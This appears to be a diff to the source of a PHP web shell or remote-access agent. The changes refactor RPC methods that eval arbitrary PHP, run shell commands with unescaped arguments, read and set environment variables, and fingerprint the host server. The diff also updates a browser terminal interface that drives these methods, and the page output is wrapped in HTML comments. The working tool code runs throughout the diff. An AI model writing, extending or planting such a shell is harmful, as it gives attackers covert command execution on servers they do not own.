@@ -510,10 +510,8 @@ class ConsoleService extends Service
     $this->persistant = array('includes');
   }
 
-  function rpc_invoke($params)
+  function rpc_invoke($name,$arguments)
   {
-    $name = $params[0];
-    $arguments = $params[1];
     $call_arguments = array();
 
     if ($arguments != null)
@@ -536,10 +534,8 @@ class ConsoleService extends Service
     return $ret;
   }
 
-  function rpc_eval($params)
+  function rpc_eval($code)
   {
-    $code = trim($params[0]);
-
     if ($code[strlen($code) - 1] != ';')
     {
       $code .= ';';
@@ -548,9 +544,9 @@ class ConsoleService extends Service
     return eval('return ' . $code);
   }
 
-  function rpc_inspect($params)
+  function rpc_inspect($code)
   {
-    $ret = $this->rpc_eval($params);
+    $ret = $this->rpc_eval($code);
 
     ob_start();
     print_r($ret);
@@ -613,6 +609,7 @@ class ShellService extends Service
 
     $output = ob_get_contents();
     ob_end_clean();
+
     return split("\n",rtrim($output,"\n\r"));
   }
 
@@ -636,15 +633,13 @@ class ShellService extends Service
     }
   }
 
-  function rpc_cwd($params=array())
+  function rpc_cwd()
   {
     return $this->cwd;
   }
 
-  function rpc_cd($params)
+  function rpc_cd($new_cwd)
   {
-    $new_cwd = $params[0];
-
     if ($new_cwd[0] != DIRECTORY_SEPARATOR)
     {
       $new_cwd = $this->cwd . DIRECTORY_SEPARATOR . $new_cwd;
@@ -661,32 +656,28 @@ class ShellService extends Service
     return false;
   }
 
-  function rpc_env($params=array())
+  function rpc_env()
   {
     return $this->env;
   }
 
-  function rpc_getenv($params)
+  function rpc_getenv($key)
   {
-    return $this->env[$params[0]];
+    return $this->env[$key];
   }
 
-  function rpc_setenv($params)
+  function rpc_setenv($key,$value)
   {
-    return $this->env[$params[0]] = $params[1];
+    return $this->env[$key] = $value;
   }
 
-  function rpc_exec($params)
+  function rpc_exec($program,$arguments=array())
   {
-    $command = 'cd ' . $this->cwd . '; ';
+    $command = "cd {$this->cwd}; {$program}";
 
-    if (count($params) > 1)
+    if (count($arguments) > 0)
     {
-      $command .= array_shift($params) . ' ' . $this->format($params);
-    }
-    else
-    {
-      $command .= $params[0];
+      $command .= ' ' . $this->format($arguments);
     }
 
     $command .= '; pwd';
@@ -755,7 +746,7 @@ function fingerprint($params=array())
     $profile['gid'] = posix_getgid();
   }
 
-  switch ($profile['php_server_api'])
+  switch ($profile['php']['server_api'])
   {
   case 'apache':
     $profile['apache_version'] = apache_get_version();
@@ -1044,17 +1035,11 @@ PHP_RPC.state=response['state'];callback(response);}});},callService:function(se
 var UI={catchExceptions:function(callback){try
 {callback();}
 catch(exception)
-{var mesg=$('<p class="exception"/>').text(exception);mesg.insertBefore("input.terminal_textarea").hide();mesg.slideDown('slow').delay(3000).fadeOut('slow',mesg.remove);}},Shell:{clear:function(){$("#console_shell").terminalClear();},print:function(message){$("#console_shell").terminalPrint(message);},exec:function(command){UI.catchExceptions(function(){PHP_RPC.callService('shell','exec',new Array(command),function(output){if(output.error!=null)
-{UI.Shell.print(output.error);}
-else
-{var text='$ '+command+"\n";if(output.returnValue!=null&&output.returnValue.length>0)
-{text+=output.returnValue;}
-UI.Shell.print(text);}});});}},PHP:{clear:function(){$("#console_php").terminalClear();},print:function(message){$("#console_php").terminalPrint(message);},inspect:function(code){UI.catchExceptions(function(){PHP_RPC.callService('console','inspect',new Array(code),function(response){if(response.error!=null)
-{UI.PHP.print(response.error);}
-else
-{var text='>> '+code+"\n";if(response.output!=null)
-{text=text+response.output;}
-UI.PHP.print(text+"=> "+response.returnValue+"\n");}});});}}};</script>
+{var mesg=$('<p class="exception"/>').text(exception);mesg.insertBefore("input.terminal_textarea").hide();mesg.slideDown('slow').delay(3000).fadeOut('slow',mesg.remove);}},Shell:{clear:function(){$("#console_shell").terminalClear();},print:function(message){$("#console_shell").terminalPrint(message);},exec:function(command){UI.catchExceptions(function(){PHP_RPC.callService('shell','exec',new Array(command),function(output){var text='$ '+command+"\n";if(output.return_value!=null&&output.return_value.length>0)
+{text+=output.return_value;}
+UI.Shell.print(text);});});}},PHP:{clear:function(){$("#console_php").terminalClear();},print:function(message){$("#console_php").terminalPrint(message);},inspect:function(code){UI.catchExceptions(function(){PHP_RPC.callService('console','inspect',new Array(code),function(response){var text='>> '+code+"\n";if(response.output!=null)
+{text+=response.output;}
+UI.PHP.print(text+"=> "+response.return_value+"\n");});});}}};</script>
     <script type="text/javascript">
       $(document).ready(function() {
         $("#console_shell").terminal(function(input) {
@@ -1112,7 +1097,6 @@ UI.PHP.print(text+"=> "+response.returnValue+"\n");}});});}}};</script>
   echo("<!-- ");
 ?>
               -->
-
             </div>
           </div>
         </div>
